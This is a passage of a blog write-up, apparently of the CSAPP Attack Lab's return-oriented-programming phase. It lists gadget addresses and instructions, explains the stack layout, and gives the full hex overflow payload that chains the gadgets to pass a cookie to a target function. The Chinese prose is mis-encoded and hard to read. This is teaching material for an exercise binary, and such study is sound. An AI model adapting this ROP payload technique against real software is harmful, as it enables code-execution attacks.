<p>ç”±äº<code>gadget</code>çš„é™åˆ¶ï¼Œä¸­é—´çš„ç»†èŠ‚éœ€è¦å¾ˆå¤šå°è¯•ï¼Œå°è¯•è¿‡ç¨‹ä¸å†ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œç›´æ¥ç»™å‡ºä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#åœ°å€ï¼š0x401aad
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#åœ°å€ï¼š0x4019a2
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#åœ°å€ï¼š0x4019cc
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">popq</span> <span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#åœ°å€ï¼š0x4019dd
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movl</span> <span class="o">%</span><span class="n">eax</span><span class="p">,</span> <span class="o">%</span><span class="n">edx</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#åœ°å€ï¼š0x401a70
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movl</span> <span class="o">%</span><span class="n">edx</span><span class="p">,</span> <span class="o">%</span><span class="n">ecx</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#åœ°å€ï¼š0x401a13
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movl</span> <span class="o">%</span><span class="n">ecx</span><span class="p">,</span> <span class="o">%</span><span class="n">esi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#åœ°å€ï¼š0x4019d6
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nf">lea</span>    <span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#åœ°å€ï¼š0x4019a2
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨æ„movl %ecx, %esiè¿™æ¡æŒ‡ä»¤å¯¹åº”89 d1ï¼Œæˆªå–ä¸‹é¢éƒ¨åˆ†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0000000000401a6e &lt;setval_167&gt;:
</span></span><span class="line"><span class="cl">  401a6e:	c7 07 89 d1 91 c3    	movl   $0xc391d189,(%rdi)
</span></span><span class="line"><span class="cl">  401a74:	c3   
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŒ‰ç†è¯´åé¢æ˜¯91ä¸æ˜¯90(nop)ï¼Œæ‰€ä»¥ä¸èƒ½å–ï¼Œä½†åœ¨x86æ±‡ç¼–ä¸­ï¼Œ0x91 è¡¨ç¤º xchg eax, ecx æŒ‡ä»¤ã€‚è¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯äº¤æ¢ %eax å’Œ %ecx å¯„å­˜å™¨çš„å€¼ã€‚ä¸å½±å“å¯„å­˜å™¨çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥ã€‚</p>
<h3 id="æ ˆå¸§è®²è§£-1">æ ˆå¸§è®²è§£
</h3><p>ä¸ºèŠ‚çœç©ºé—´ï¼Œæ¯ä¸€è¡Œä»£ç éƒ½çœç•¥äº†åé¢çš„<code>ret</code>ï¼Œ<img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w.webp"
	width="1132"
	height="796"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w_hu9797061224875917748.webp 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-e6b363c3011f34a0ca44db987f2c0d13_1440w_hu17673280219868860253.webp 1024w"
	loading="lazy"
	
		alt="å›¾8"
	
	
		class="gallery-image" 
		data-flex-grow="142"
		data-flex-basis="341px"
	
></p>
<p>é€»è¾‘åœ¨å›¾ä¸Šæ ‡çš„å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œå°±ä¸å†ç”¨æ–‡å­—å†™å•¦ï¼</p>
<p><strong>è¦æ³¨æ„</strong>ï¼Œ<code>getbuf</code>æ‰§è¡Œ<code>ret</code>åç›¸å½“äºè¿›è¡Œäº†ä¸€æ¬¡<code>pop</code>æ“ä½œï¼Œ<code>test</code>çš„æ ˆé¡¶æŒ‡é’ˆ<code>%rsp=%rsp+0x8</code>ï¼Œæ‰€ä»¥<code>cookie</code>ç›¸å¯¹äºæ­¤æ—¶æ ˆé¡¶æŒ‡é’ˆçš„åç§»é‡æ˜¯<code>0x48</code>è€Œä¸æ˜¯<code>0x50</code></p>
<h3 id="solution-2">Solution
</h3><p>æ ¹æ®ä¸Šå›¾çš„æ ˆå¸§ï¼Œå†™å‡ºè¾“å…¥åºåˆ—ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">ad 1a 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">a2 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">cc 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">48 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">dd 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">70 1a 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">13 1a 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">d6 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">a2 19 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">fa 18 40 00 00 00 00 00 
</span></span><span class="line"><span class="cl">35 39 62 39 39 37 66 61
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/en/tags/csapp/">CSAPP</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on 2024-10-05
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.body, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>
    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/">
        
        
            <div class="article-image">
                <img src="/en/p/csappbuffer%E5%AE%9E%E9%AA%8C/1.fd6d165890cb6fc8696f518e0f48c578_hu4307839397655323871.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post CSAPP:bufferå®éªŒ"
                        
                        data-hash="md5-/W0WWJDLb8hpb1GOD0jFeA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CSAPP:bufferå®éªŒ</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/en/p/csappbomb%E5%AE%9E%E9%AA%8C/">
        
        
            <div class="article-image">
                <img src="/en/p/csappbomb%E5%AE%9E%E9%AA%8C/1.4f8eafc410317f2bf041ef2b416c59e5_hu2708113943110592542.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post CSAPP:bombå®éªŒ"
                        
                        data-hash="md5-T46vxBAxfyvwQe8rQWxZ5Q==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CSAPP:bombå®éªŒ</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <link rel="stylesheet" href="https://unpkg.com/@waline/client@v3/dist/waline.css" />
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }

    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script type="module">
    import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js';
    init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/qq","https://cdn.jsdelivr.net/gh/walinejs/emojis@1.0.0/bilibili"],"lang":"zh-CN","locale":{"admin":"Admin","placeholder":"æ„Ÿè°¢æ‚¨çš„è¯„è®º"},"pageview":true,"requiredMeta":["nick"],"serverURL":"https://chenyuan1125.top","visitor":true});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Lee
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.27.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
